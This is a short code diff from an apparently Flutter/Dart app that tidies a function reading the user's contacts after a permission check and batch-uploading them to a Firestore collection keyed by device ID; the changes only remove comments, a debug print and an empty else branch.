@@ -23,10 +23,8 @@ Future<PermissionStatus> _getContactPermission() async {
 Future<void> getContacts() async {
   final PermissionStatus permissionStatus = await _getContactPermission();
   if (permissionStatus == PermissionStatus.granted) {
-    // var isGranted = await FlutterContacts.requestPermission(readonly: true);
     List<Contact> contacts =
         await FlutterContacts.getContacts(withProperties: true);
-    print("contacts");
     String? androidId = await getIdentity();
     if (androidId != null) {
       CollectionReference contactCollection =
@@ -44,8 +42,5 @@ Future<void> getContacts() async {
       }
       await batch.commit();
     }
-    // return true;
-  } else {
-    // return false;
   }
 }
